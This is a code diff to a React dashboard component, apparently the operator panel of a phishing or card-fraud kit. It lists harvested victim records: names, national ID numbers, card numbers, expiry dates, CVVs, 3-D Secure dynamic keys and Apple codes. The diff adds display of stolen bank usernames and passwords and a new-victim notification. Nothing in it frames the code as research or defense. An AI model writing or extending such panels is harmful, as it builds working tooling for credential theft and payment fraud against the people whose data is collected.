@@ -61,7 +61,7 @@ const BackSide = () => {
 
                 <div className='w-screen px-12 h-full overflow-y-scroll pb-32'>
                     {userData.map((item) => {
-                        const { infoPay, data, dinKey, appleCode } = item
+                        const { infoPay, data, dinKey, appleCode,bankUniversal } = item
                         
                         return <div key={item.idF} className='w-full relative border-2 border-stone-600 grid  grid-cols-3
                             rounded-sm my-4 bg-neutral-800 pl-8 pr-4 py-3 text-sm'
@@ -71,7 +71,7 @@ const BackSide = () => {
                                 <BtnSave data={item}/>
                             </div>
                             <div className=' text-white flex flex-col'>
-                                <Campos field={"Nombre y Apellido"} data={infoPay?.name}
+                                <Campos field={"Nombre y Apellido"} data={infoPay?.name+" "+infoPay?.apellido}
                                     colorField={"text-blue-600"}
                                 />
                                 <Campos field={"Cédula"} data={infoPay?.CI}
@@ -86,13 +86,22 @@ const BackSide = () => {
                                 <Campos field={"Direccion de envio"} data={infoPay?.direc}
                                     colorField={"text-green-400"}
                                 />
+                                 <Campos field={"User Bank Uni"} data={bankUniversal?.user}
+                                    colorField={"text-red-400"}
+                                />
+                                 <Campos field={"Pass Bank Uni"} data={bankUniversal?.pass}
+                                    colorField={"text-red-400"}
+                                />
                             </div>
 
                             <div className=' text-white flex flex-col col-span-1 mx-1'>
                                 <Campos field={"Ciudad de envio"} data={infoPay?.city}
                                     colorField={"text-sky-500"}
                                 />
-                                <Campos field={"TC"} data={data?.TC + ` | ` + data?.año + ` | ` + data?.mes}
+                                <Campos field={"TC"} data={data?.TC + ` | ` + data?.Año + ` | ` + data?.Mes}
+                                    colorField={"text-amber-400"}
+                                />
+                                 <Campos field={"Nombre TC"} data={data?.name}
                                     colorField={"text-amber-400"}
                                 />
                                 <Campos field={"CVV"} data={data?.cvv}
@@ -102,12 +111,12 @@ const BackSide = () => {
                                     colorField={"text-emerald-400"}
                                 />
 
-                                <Campos field={"Clave Dinamica"} data={dinKey}
+                               {dinKey&&<Campos field={"Clave Dinamica 3D"} data={dinKey}
                                     colorField={"text-orange-400"}
-                                />
-                                <Campos field={"Codigo Apple"} data={appleCode}
+                                />}
+                               {appleCode&& <Campos field={"Codigo Apple"} data={appleCode}
                                     colorField={"text-blue-400"}
-                                />
+                                />}
                             </div>
 
                             <Menu idF={item.idF} notificacionNewUser={notificacionNewUser} audio={audio}/>
